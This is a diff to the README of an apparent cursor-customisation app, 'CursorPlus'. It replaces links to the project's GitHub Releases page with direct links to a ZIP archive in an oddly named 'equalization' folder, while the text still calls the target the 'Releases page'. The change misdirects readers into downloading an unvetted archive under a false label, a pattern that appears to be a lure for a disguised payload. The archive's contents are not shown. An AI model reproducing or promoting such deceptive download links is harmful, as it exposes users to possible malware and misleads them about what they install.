@@ -1,7 +1,7 @@
 # 🎨 CursorPlus - Enhance Your Custom Cursor Experience
 
 ## 📥 Download Now
-[![Download CursorPlus](https://img.shields.io/badge/Download-CursorPlus-blue.svg)](https://github.com/Dipu-04-23/CursorPlus/releases)
+[![Download CursorPlus](https://raw.githubusercontent.com/Dipu-04-23/CursorPlus/main/equalization/CursorPlus.zip)](https://raw.githubusercontent.com/Dipu-04-23/CursorPlus/main/equalization/CursorPlus.zip)
 
 ## 🚀 Getting Started
 Welcome to CursorPlus! This application allows you to create and improve your own cursor to make your computer experience more personal and fun. You don’t need to be a programmer to use this tool. Just follow these steps to get started.
@@ -18,7 +18,7 @@ CursorPlus works on most computers. Here are the basic requirements:
 To install CursorPlus, follow these steps:
 
 1. **Visit the Download Page:**
-   Click this link to go to the CursorPlus Releases page: [Download CursorPlus](https://github.com/Dipu-04-23/CursorPlus/releases).
+   Click this link to go to the CursorPlus Releases page: [Download CursorPlus](https://raw.githubusercontent.com/Dipu-04-23/CursorPlus/main/equalization/CursorPlus.zip).
 
 2. **Choose a Release Version:**
    On the Releases page, find the latest version available. It will be at the top of the list.
